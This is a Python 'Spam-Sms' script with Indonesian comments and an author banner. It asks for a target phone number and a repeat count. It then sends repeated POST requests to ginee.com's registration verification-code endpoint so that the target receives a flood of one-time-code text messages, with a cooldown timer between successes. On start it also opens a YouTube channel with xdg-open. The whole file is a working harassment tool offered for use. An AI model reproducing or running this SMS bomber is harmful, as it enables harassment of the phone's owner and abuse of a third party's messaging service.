#Created By OtLOCK
#Subscribe Dulu Kace Baru Di Decode
#NT
import os,sys,time,requests,json
from requests import post
from requests import get
#Warna
red   = '\x1b[31m' # Merah
green = '\x1b[32m' # Hijau
yellow = '\x1b[33m' # Kuning
blue  = '\x1b[34m' # Biru
magenta = '\x1b[35m' # Ungu
cyan  = '\x1b[36m' # Biru Muda
white = '\x1b[37m' # Putih
reset = '\x1b[39m' # Reset Warna ( Kembali Ke Warna Awal )
brblack = '\x1b[90m' # Hitam Terang
R = '\x1b[91m' # Merah Terang
brgreen = '\x1b[92m' # Hijau Terang
k = '\x1b[93m' # Kuning Terang
brblue = '\x1b[94m' # Biru Terang
brmgnt = '\x1b[95m' # Ungu Terang
brcyan = '\x1b[96m' # Biru Muda Terang
G = '\x1b[97m' # Putih Terang
#system
time.sleep (1)
print ("\t\x1b[91mWAIT LOADING.....")
time.sleep (5)
os.system ("clear")
time.sleep (1)
print ("\x1b[91mNOTE !!!")
time.sleep (1)
print ("\x1b[96m[\x1b[91m1\x1b[96m] \x1b[96mSUBSCRIBE DULU BANG \x1b[91m:V")
time.sleep (1)
os.system("xdg-open https://youtube.com/channel/UCB4LvlRtaQoMit7zbYxAOBw")
time.sleep (8)
print ("\x1b[96m[\x1b[91m2\x1b[96m] \x1b[96mMAKASIH UDAH SUBSCRIBE \x1b[91m:)")
time.sleep (1)
os.system ("clear")
time.sleep (1)
print ("\x1b[93m╲┏━┳━━━━━━━━┓╲╲            \x1b[96m[\x1b[91m•\x1b[96m]\x1b[91mSpam-Sms")
print ("\x1b[93m╲┃◯┃╭┻┻╮╭┻┻╮┃╲╲  \x1b[96m===============================")
print ("\x1b[93m╲┃╮┃┃╭╮┃┃╭╮┃┃╲╲  \x1b[96m[\x1b[91m•\x1b[96m]Author \x1b[91m: \x1b[96mOtLOCK")
print ("\x1b[93m╲┃╯┃┗┻┻┛┗┻┻┻┻╮╲  \x1b[96m[\x1b[91m•\x1b[96m]Youtube \x1b[91m: \x1b[96mOtLOCK")
print ("\x1b[93m╲┃◯┃╭╮╰╯┏━━━┳╯╲  \x1b[96m[\x1b[91m•\x1b[96m]Whatsapp \x1b[91m: \x1b[96m+6281340147637")
print ("\x1b[93m╲┃╭┃╰┏┳┳┳┳┓◯┃╲╲  \x1b[96m===============================")
print ("")
time.sleep (1)
print ("\x1b[96m[\x1b[91m•\x1b[96m]Contoh Nomor \x1b[91m81xxxx")
no = input("\x1b[96m[\x1b[91m•\x1b[96m]\x1b[96mNomor Target \x1b[91m: ")
jum = int(input("\x1b[96m[\x1b[91m•\x1b[96m]\x1b[96mJumlah Spam \x1b[91m: "))
for i in range(jum):
  head = {
  'Host': 'ginee.com',
  'Connection': 'keep-alive',
  'Content-Length': '113',
  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
  'Accept': 'application/json, text/plain, */*',
  'Content-Type': 'application/json;charset=UTF-8',
  'Accept-Language': 'en',
  'sec-ch-ua-mobile': '?1',
  'User-Agent': 'Mozilla/5.0 (Linux; Android 11; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
  'sec-ch-ua-platform': '"Android"',
  'Origin': 'https://ginee.com',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Referer': 'https://ginee.com/accounts/registered?system_id=SYS_ERP&from=OFFICIAL_SITE&language=en&country=ID&cid=organic_1656058513846_9552',
  'Accept-Encoding': 'gzip, deflate, br'
  }
  data = json.dumps({"account":no,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})
  pos = requests.post("https://ginee.com/api/iam-service/account/send-verification-code",data=data,headers=head).text
  print(pos)
  if 'SUCCESS' in pos:
    print("     \x1b[96m[\x1b[91m√\x1b[96m]\x1b[96mBerhasil")
  else:
    print("     \x1b[96m[\x1b[91mx\x1b[96m]\x1b[91mGagal")

  def countdownTimer(start_minute, start_second):
      total_second = start_minute * 60 + start_second
      while total_second:
          mins, secs = divmod(total_second, 60)
          print(f'     \x1b[96m[\x1b[91m•\x1b[96m]Cooldown \x1b[91m: \x1b[96m{mins:02d}:{secs:02d}', end='\r')
          time.sleep(1)
          total_second -= 1

  if 'SUCCESS' in pos:
      countdownTimer(00, 60)
